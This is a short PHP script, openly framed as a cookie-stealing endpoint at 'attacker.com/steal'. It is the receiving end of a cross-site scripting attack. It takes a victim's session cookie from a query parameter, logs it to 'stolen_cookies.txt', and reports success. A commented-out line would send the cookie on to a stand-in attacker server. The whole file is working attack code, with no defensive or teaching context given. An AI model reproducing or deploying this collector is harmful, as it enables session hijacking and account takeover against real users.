<?php
// attacker.com/steal?cookie=

if (isset($_GET['cookie'])) {
    // Capture the cookie value passed in the query parameter
    $stolen_cookie = $_GET['cookie'];

    // Store or log the stolen cookie (e.g., log to a file or send to an attacker server)
    file_put_contents("stolen_cookies.txt", $stolen_cookie . PHP_EOL, FILE_APPEND);

    // Optionally, you can send the cookie to an attacker-controlled server
    // file_get_contents("http://attacker.com/collect?cookie=" . urlencode($stolen_cookie));

    echo "Cookie stolen successfully!";
} else {
    echo "No cookie parameter found.";
}
?>
